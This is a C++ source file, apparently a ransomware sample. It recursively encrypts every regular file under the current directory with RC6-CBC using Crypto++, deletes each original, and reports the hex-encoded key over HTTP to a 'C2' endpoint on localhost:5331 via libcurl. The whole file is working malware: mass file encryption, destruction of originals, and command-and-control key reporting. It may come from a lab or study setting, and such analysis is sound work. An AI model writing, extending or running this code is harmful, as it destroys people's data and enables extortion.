#include <vector>
#include <cstdio>
#include <cstdint>
#include <filesystem>
#include <cryptopp/hex.h>
#include <cryptopp/rc6.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/secblock.h>
#include <curl/curl.h>

#include "key_gen.hpp"

namespace fs = std::filesystem;


CryptoPP::SecByteBlock gen_key(void)
{
	auto key = extern_gen_key();
	return CryptoPP::SecByteBlock(key.data(), key.size());
}

void encrypt_file(const std::string& file_path, const CryptoPP::SecByteBlock& key)
{
	// Generate random IV
	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::byte iv[CryptoPP::RC6::BLOCKSIZE] = { 0 };
	prng.GenerateBlock(iv, sizeof(iv));

	// Set up crypto object
	CryptoPP::CBC_Mode<CryptoPP::RC6>::Encryption crypt(key, key.size(), iv);

	// Write IV to start of encrypted file
	auto sink = new CryptoPP::FileSink((file_path + ".enc").c_str(), true);
	sink->Put(iv, sizeof(iv));

	// Read from input file, encrypt and write it to output file
	CryptoPP::FileSource(file_path.c_str(), true,
			new CryptoPP::StreamTransformationFilter(crypt,
				sink), true);

	remove(file_path.c_str());
}

bool c2_report(const CryptoPP::SecByteBlock& key)
{
	CURL *conn = NULL;
	CURLcode code;

	// Hex encode the key
	std::string encoded_key;
	CryptoPP::StringSource(key.data(), key.size(), true,
			new CryptoPP::HexEncoder(
				new CryptoPP::StringSink(encoded_key)));

	// Init CURL before using it
	curl_global_init(CURL_GLOBAL_DEFAULT);

	// Init connection
	conn = curl_easy_init();
	curl_easy_setopt(conn, CURLOPT_URL, ("http://localhost:5331/"+encoded_key).c_str());
	curl_easy_setopt(conn, CURLOPT_HTTPGET, 1L);

	// Perform connection
	code = curl_easy_perform(conn);

	// Cleanup connection and check response code
	curl_easy_cleanup(conn);
	if (code != CURLE_OK) {
		fprintf(stderr, "Error: did not a get a 200 OK\n");
		return false;
	}

	return true;
}

int main(void)
{
	/// Generate key
	auto key = gen_key();

	// Iterate over regular files and encrypt them
	for (auto &entry : fs::recursive_directory_iterator(fs::current_path())) {
		if (entry.is_regular_file()) {
			encrypt_file(entry.path().string(), key);
		}
	}

	// Perform C2 reporting of encryption key
	if (!c2_report(key)) {
		fprintf(stderr, "Failed to report success\n");
		return -1;
	}

	return 0;
}
